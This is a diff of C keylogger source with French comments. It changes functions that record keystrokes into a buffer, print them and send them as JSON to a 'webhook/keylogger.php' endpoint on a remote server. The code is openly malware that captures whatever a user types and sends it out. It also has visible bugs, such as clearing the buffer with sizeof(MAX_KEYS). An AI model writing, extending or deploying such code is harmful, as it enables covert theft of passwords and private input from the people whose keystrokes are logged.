@@ -11,9 +11,11 @@ char key_log[MAX_KEYS];
 int current_key_log_size = 0;
 
 
-void key_code_to_string(int keycode){
+void key_code_log_to_string(){
     // Permet d'avoir la touche exacte avec son code décimal
-    return keycode - 32;
+    for(int i = 0; i < MAX_KEYS; i++){
+        printf("%c, %d \n", key_log[i],key_log[i]);
+    }
 }
     
 
@@ -22,10 +24,13 @@ void send_keys(void){
 
     /*Permet d'envoyer les frappes de claviers au serveur et de vider le tableau  key_log*/
 
+    key_code_log_to_string();
+    
     char data[MAX_KEYS+50];
     snprintf(data, MAX_KEYS+50, "{\"keys\": \"%s\"}", key_log);
     memset(key_log, 0, sizeof(MAX_KEYS)); // vider le tableau
     current_key_log_size = 0;
+    
     send_to_server("webhook/keylogger.php", data);
 }
 
@@ -33,8 +38,7 @@ void send_keys(void){
 void log_key(int key) {
 
     /*Permet d'enregistrer les frappes de claviers dans le tab key_log*/
-    int key2 =  key_code_to_string(key); 
-    snprintf(key_log, 1024, "%s%c", key_log, key2); // rajoute le caractère dans key_log
+    snprintf(key_log, 1024, "%s%c", key_log, key); // rajoute le caractère dans key_log
     current_key_log_size++; // +=1
     if(current_key_log_size >= MAX_KEYS){ //vérifier si l'utilisateur à taper assez pour envoyer les clefs au server
         send_keys();
